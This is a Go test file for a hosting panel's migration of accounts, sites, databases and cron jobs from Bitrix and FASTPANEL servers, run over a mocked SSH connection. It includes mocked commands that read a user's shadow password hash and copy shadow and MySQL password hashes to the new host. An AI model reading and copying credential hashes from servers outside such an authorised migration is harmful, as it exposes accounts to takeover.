	job, err := target.db.GetJob(target.ctx, ref.JobID)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(job.Payload), remote.password) {
		t.Error("пароль ssh лежит в задаче открытым текстом")
	}
	if job := target.waitJob(ref.JobID); job.Status != store.JobDone {
		t.Fatalf("перенос: %s %s", job.Status, job.Error)
	}
	u, err := target.db.GetUserByLogin(target.ctx, "bitrix")
	if err != nil {
		t.Fatal(err)
	}
	if u.Status != store.UserActive || target.agent.Shadow["bitrix"] != "$6$salt$bitrixhash" {
		t.Errorf("аккаунт: %s, shadow %q", u.Status, target.agent.Shadow["bitrix"])
	}
	site, err := target.db.GetSiteByDomain(target.ctx, "shop.example.com")
	if err != nil || site.Preset != "bitrix" || site.UserID != u.ID || site.ClientMaxBody != "256m" {
		t.Errorf("сайт: %+v %v", site, err)
	}
	// The dump is loaded as the database's own account (auth_socket for root
	// while it loads), which then gets its plain password, not a hash.
	var loader, restored bool
	for _, sql := range mysqlSQL {
		if strings.Contains(sql, "CREATE USER 'shop_u'@'localhost' IDENTIFIED WITH auth_socket AS 'root'") && strings.Contains(sql, "GRANT ALL PRIVILEGES ON `sitemanager`.*") {
			loader = true
		}
		if strings.Contains(sql, "ALTER USER 'shop_u'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'pl4in-P@ss'") {
			restored = true
		}
	}
	if !loader || !restored {
		t.Errorf("аккаунт базы не заведён паролем: %q", mysqlSQL)
	}
	tarCmd := remote.command("tar -C '/home/bitrix'")
	for _, want := range []string{"'www' 'ext_www/shop.example.com'", `s|^www\(/\|$\)|data/www/main.example.com\1|S`, `s|^ext_www/shop\.example\.com\(/\|$\)|data/www/shop.example.com\1|S`, `s|^/home/bitrix/www\(/\|$\)|` + target.s.cfg.WWWRoot + `/bitrix/data/www/main.example.com\1|R`, "--exclude='*/bitrix/cache/*'", "|| [ $? -eq 1 ]"} {
		if !strings.Contains(tarCmd, want) {
			t.Errorf("tar на источнике без %q: %s", want, tarCmd)
		}
	}
	if dump := remote.command("mysqldump "); !strings.Contains(dump, "--databases 'sitemanager'") || !strings.Contains(dump, "NO_AUTO_CREATE_USER") {
		t.Errorf("дамп без фильтра sql_mode для MySQL 5.7: %s", dump)
	}
	var tarIn, mysqlIn bool
	for _, st := range target.agent.Streams() {
		if st.Direction == "in" && st.Name == "tar" && st.Bytes > 0 {
			tarIn = true
		}
		if st.Direction == "in" && st.Name == "mysql" && st.Bytes > 0 {
			mysqlIn = true
			if args := strings.Join(st.Args, " "); args != "--protocol=socket --binary-mode --local-infile=0 --user=shop_u sitemanager" {
				t.Errorf("дамп грузится не учёткой базы или без --binary-mode: %s", args)
			}
		}
	}
	if !tarIn || !mysqlIn {
		t.Errorf("потоки: tar=%v mysql=%v", tarIn, mysqlIn)
	}
	// The kernel link of the link site arrives, as a relative link to the
	// main site's bitrix/ (an absolute one would be refused as leading out).
	if link := tarSymlinks(t, target.agent.Streams())["data/www/shop.example.com/bitrix"]; link != "../main.example.com/bitrix" {
		t.Errorf("симлинк ядра сайта-ссылки: %q, ожидалось ../main.example.com/bitrix", link)
	}
	if got := written["data/www/main.example.com/bitrix/php_interface/dbconn.php"]; !strings.Contains(got, target.s.cfg.WWWRoot+"/bitrix/.bx_temp/sitemanager") {
		t.Errorf("dbconn.php не переписан: %q", got)
	}
	if got := written["data/www/main.example.com/export/export-csv.php"]; !strings.Contains(got, `"`+target.s.cfg.WWWRoot+"/bitrix/data/www/main.example.com/export/export.csv") {
		t.Errorf("скрипт с /home/bitrix не переписан: %q", got)
	}
	cron, _ := target.db.ListCronJobs(target.ctx, u.ID)
	if len(cron) != 5 || !strings.Contains(cron[0].Command, "/bitrix/data/www/main.example.com/") || cron[1].Enabled || !cron[2].Enabled || cron[2].Comment != "from root's crontab; экспорт" ||
		!cron[3].Enabled || cron[3].Comment != "from /etc/crontab; резервная копия" || !cron[4].Enabled || cron[4].Comment != "from /etc/cron.d/bx_sitemap; карта сайта" {
		for _, j := range cron {
			t.Errorf("cron: %+v", j)
		}
	}
}

// A FASTPANEL server: its SQLite database says who owns what; the files and
// the MySQL hashes come from the machine itself.
func TestMigrationFromFastpanel(t *testing.T) {
	fakeUnixAccounts(t)
	dbFile := filepath.Join(t.TempDir(), "fastpanel2.db")
	fp, err := sql.Open("sqlite", dbFile)
	if err != nil {
		t.Fatal(err)
	}
	for _, stmt := range []string{
		`CREATE TABLE panel_account (id INTEGER PRIMARY KEY, username TEXT, home_dir TEXT, ssh_access NUMERIC, quota_value INTEGER)`,
		`INSERT INTO panel_account VALUES (7, 'shop', '/var/www/shop/data', 1, 0), (8, 'other', '/var/www/other/data', 0, 0)`,
		`CREATE TABLE site (id INTEGER PRIMARY KEY, domain TEXT, index_dir TEXT, https_redirect NUMERIC, http2 NUMERIC, certificate_id INTEGER, status TEXT, manual_changes NUMERIC, owner_id INTEGER)`,
		`INSERT INTO site VALUES (11, 'Shop.Example.com', '/var/www/shop/data/www/shop.example.com/public', 1, 1, 3, 'active', 0, 7), (12, 'blog.example.com', '/var/www/shop/data/www/blog.example.com', 0, 0, 4, 'active', 1, 7), (13, 'x.example.com', '', 0, 0, NULL, 'active', 0, 8)`,
		`CREATE TABLE virtualhost_aliases (id INTEGER PRIMARY KEY, name TEXT, site_id INTEGER)`,
		`INSERT INTO virtualhost_aliases VALUES (1, 'www.shop.example.com', 11), (2, 'old.example.com', 11)`,
		`CREATE TABLE website_backends (id INTEGER PRIMARY KEY, frontend_id INTEGER, main NUMERIC, handler TEXT, handler_version TEXT, type TEXT, addr TEXT, port INTEGER)`,
		`INSERT INTO website_backends VALUES (1, 11, 1, 'php_fpm', '84', 'php', '127.0.0.1', 3025), (2, 12, 1, 'fcgi', '84', 'php', '127.0.0.1', 3026)`,
		`CREATE TABLE db (id INTEGER PRIMARY KEY, name TEXT, owner_id INTEGER)`,
		`INSERT INTO db VALUES (5, 'shop_db', 7), (6, 'other_db', 8)`,
		`CREATE TABLE database_user (id INTEGER PRIMARY KEY, login TEXT, owner_id INTEGER)`,
		`INSERT INTO database_user VALUES (9, 'shop_u', 7)`,
		`CREATE TABLE datbases_users (id INTEGER PRIMARY KEY, user_id INTEGER, database_id INTEGER)`,
		`INSERT INTO datbases_users VALUES (1, 9, 5)`,
		`CREATE TABLE certificate (id INTEGER PRIMARY KEY, name TEXT, certificate TEXT, chain TEXT, private_key TEXT, type TEXT, enabled NUMERIC)`,
		`INSERT INTO certificate VALUES (3, 'shop.example.com_2024', 'not a pem', '', 'nope', 'exists', 1), (4, 'blog.example.com_2025', '', '', '', 'letsencrypt', 1)`,
		`CREATE TABLE virtualhost_configuration (id INTEGER PRIMARY KEY, virtualhost_id INTEGER, frontend TEXT)`,
		`INSERT INTO virtualhost_configuration VALUES (1, 11, 'server {
  location / {
    allow 185.253.8.0/24;
    allow 83.97.77.254;
    deny all;
  }
  location ~ \.php$ { allow 185.253.8.0/24; deny all; }
}'), (2, 12, 'server { location / { allow 10.0.0.0/8; } }')`,
		`CREATE TABLE mailboxes (id INTEGER PRIMARY KEY, owner_id INTEGER)`,
		`INSERT INTO mailboxes VALUES (1, 7), (2, 7)`,
	} {
		if _, err := fp.Exec(stmt); err != nil {
			t.Fatalf("%s: %v", stmt, err)
		}
	}
	fp.Close()
	raw, err := os.ReadFile(dbFile)
	if err != nil {
		t.Fatal(err)
	}

	remote := newFakeSSH(t)
	remote.files[fastpanelDB] = "binary"
	remote.dirs["/var/www/shop/data/www/shop.example.com/public/wp-includes/version.php"] = true
	remote.answers["python3 -c"] = string(raw)
	remote.answers["php -r"] = "8.4"
	remote.answers["getent passwd 'shop'"] = "shop:x:1001:1001::/var/www/shop/data:/bin/bash\n"
	remote.answers["getent shadow 'shop'"] = "shop:$y$j9T$shophash:19000::::::\n"
	remote.answers["hostname"] = "fp.example.net\n"
	remote.answers["dpkg-query"] = "2.7.0"
	remote.files["/var/www/httpd-cert/blog.example.com_2025.crt"] = "not a pem either"
	remote.files["/var/www/httpd-cert/blog.example.com_2025.key"] = "nope"
	remote.answers["crontab -l -u 'shop'"] = "0 3 * * * /usr/bin/php /var/www/shop/data/www/shop.example.com/public/cron.php\n"
	mysqlAnswers(remote, "777")
	inner := remote.handler
	remote.handler = func(cmd string) (string, int) {
		if strings.HasPrefix(cmd, "tar -C '/var/www/shop/data'") {
			return tarOf(t, map[string]string{"data/www/shop.example.com/public/index.php": "<?php\n"}), 0
		}
		return inner(cmd)
	}

	target := newSiteFixture(t)
	target.installDB()
	var mysqlSQL []string
	target.agent.ToolHook = func(req agent.ToolRequest) *agent.ToolResponse {
		if req.Name == "mysql" {
			mysqlSQL = append(mysqlSQL, req.Stdin)
		}
		return nil
	}
	body := map[string]any{"panel": "fastpanel", "source": "root@" + remote.addr, "password": remote.password}
	var noScope struct {
		Detail string `json:"detail"`
	}
	target.call(http.MethodPost, "/migrate/plan", body, http.StatusUnprocessableEntity, &noScope)
	if !strings.Contains(noScope.Detail, "other, shop") {
		t.Errorf("без --scope должны перечисляться аккаунты: %+v", noScope)
	}
	body["scope"] = "user:shop"
	body["as"] = "shop2"
	var plan struct {
		Login  string `json:"login"`
		OK     bool   `json:"ok"`
		Bundle struct {
			Panel string `json:"panel"`
			Sites []struct {
				Domain, Preset, Mode, Docroot string
				PHPVersion                    string `json:"php_version"`
				Aliases                       []string
				AllowFrom                     []string `json:"allow_from"`
				RedirectHTTPS                 bool     `json:"redirect_https"`
				HTTP2                         bool     `json:"http2"`
			}
			SiteNginx map[string]string `json:"site_nginx"`
			Databases []struct {
				Name  string `json:"name"`
				Users []struct{ Name, Host string }
			}
			Cron  []struct{ Command string }
			Notes []string
		} `json:"bundle"`
		Conflicts []struct{ Text string }
	}
	// blog.example.com arrives in the nginx + Apache mode: without Apache here
	// the plan refuses and says what to install.
	target.call(http.MethodPost, "/migrate/plan", body, http.StatusOK, &plan)
	if plan.OK || len(plan.Conflicts) != 1 || !strings.Contains(plan.Conflicts[0].Text, "Apache is not installed") {
		t.Fatalf("разбор без Apache: %+v", plan.Conflicts)
	}
	if err := target.db.SetSetting(target.ctx, settingApache, "installed"); err != nil {
		t.Fatal(err)
	}
	plan.Conflicts = nil
	target.call(http.MethodPost, "/migrate/plan", body, http.StatusOK, &plan)
	if !plan.OK || plan.Login != "shop2" {
		t.Fatalf("разбор: %+v", plan)
	}
	b := plan.Bundle
	if b.Panel != "FASTPANEL 2.7.0" || len(b.Sites) != 2 {
		t.Fatalf("бандл: %s %+v", b.Panel, b.Sites)
	}
	shop, blog := b.Sites[1], b.Sites[0]
	if shop.Domain != "shop.example.com" || strings.Join(shop.Aliases, ",") != "old.example.com" || shop.Preset != "wordpress" || shop.PHPVersion != "8.4" || shop.Docroot != "public" || !shop.RedirectHTTPS || !shop.HTTP2 || shop.Mode != "fpm" {
		t.Errorf("shop: %+v", shop)
	}
	if strings.Join(shop.AllowFrom, ",") != "185.253.8.0/24,83.97.77.254" {
		t.Errorf("allow-список не перенесён: %+v", shop.AllowFrom)
	}
	if blog.Domain != "blog.example.com" || blog.Mode != "apache" || blog.PHPVersion != "8.4" || blog.Preset != "" || blog.Docroot != "" || len(blog.AllowFrom) != 0 || blog.HTTP2 {
		t.Errorf("blog: %+v", blog)
	}
	if len(b.SiteNginx) != 0 {
		t.Errorf("сгенерированный конфиг FASTPANEL не должен ехать как свои директивы: %+v", b.SiteNginx)
	}
	var manualNote bool
	for _, n := range b.Notes {
		if strings.Contains(n, "blog.example.com: its nginx configs were edited by hand") {
			manualNote = true
		}
	}
	if !manualNote {
		t.Errorf("нет заметки о ручных правках: %v", b.Notes)
	}
	if remote.command("cat '/var/www/httpd-cert/blog.example.com_2025.crt'") == "" {
		t.Error("сертификат Let's Encrypt должен читаться с диска")
	}
	if len(b.Databases) != 1 || b.Databases[0].Name != "shop_db" || len(b.Databases[0].Users) != 1 || b.Databases[0].Users[0].Name != "shop_u" {
		t.Errorf("базы: %+v", b.Databases)
	}
	if len(b.Cron) != 1 || !strings.Contains(b.Cron[0].Command, target.s.cfg.WWWRoot+"/shop2/data/www/shop.example.com/public/cron.php") {
		t.Errorf("cron под новым логином не переписан: %+v", b.Cron)
	}
	var mailNote bool
	for _, n := range b.Notes {
		if strings.Contains(n, "account mailboxes: 2") {
			mailNote = true
		}
	}
	if !mailNote {
		t.Errorf("заметки: %v", b.Notes)
	}
	var ref struct {
		JobID int64 `json:"job_id"`
	}
	target.call(http.MethodPost, "/migrate/run", body, http.StatusAccepted, &ref)
	if job := target.waitJob(ref.JobID); job.Status != store.JobDone {
		t.Fatalf("перенос: %s %s", job.Status, job.Error)
	}
	u, err := target.db.GetUserByLogin(target.ctx, "shop2")
	if err != nil || target.agent.Shadow["shop2"] != "$y$j9T$shophash" {
		t.Fatalf("аккаунт: %v, shadow %q", err, target.agent.Shadow["shop2"])
	}
	if _, err := target.db.GetSiteByDomain(target.ctx, "blog.example.com"); err != nil {
		t.Errorf("blog не приехал: %v", err)
	}
	var hashed bool
	for _, sql := range mysqlSQL {
		if strings.Contains(sql, "ALTER USER 'shop_u'@'localhost' IDENTIFIED WITH mysql_native_password AS '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'") {
			hashed = true
		}
	}
	if !hashed {
		t.Errorf("аккаунт базы должен приехать хешем: %q", mysqlSQL)
	}
	inst, _ := target.db.GetDBInstance(target.ctx)
	if inst == nil || !inst.NativePassword {
		t.Error("mysql_native_password должен включиться под старый хеш")
	}
	tarCmd := remote.command("tar -C '/var/www/shop/data'")
	if !strings.Contains(tarCmd, "-cf - 'www'") || !strings.Contains(tarCmd, "data/www") {
		t.Errorf("tar: %s", tarCmd)
	}
	dbs, _ := target.db.ListDatabases(target.ctx, u.ID)
	if len(dbs) != 1 || dbs[0].Name != "shop_db" {
		t.Errorf("базы: %+v", dbs)
	}
}

// installDB tells the fixture's panel a database server is ready: the
// import refuses databases without one.
func (f *siteFixture) installDB() {
	f.t.Helper()
	if err := f.db.UpsertDBInstance(f.ctx, &store.DBInstance{Engine: "percona", Version: "8.4.11", Socket: "/var/run/mysqld/mysqld.sock", Service: "mysql.service", Status: store.DBReady}); err != nil {
		f.t.Fatal(err)
	}
}
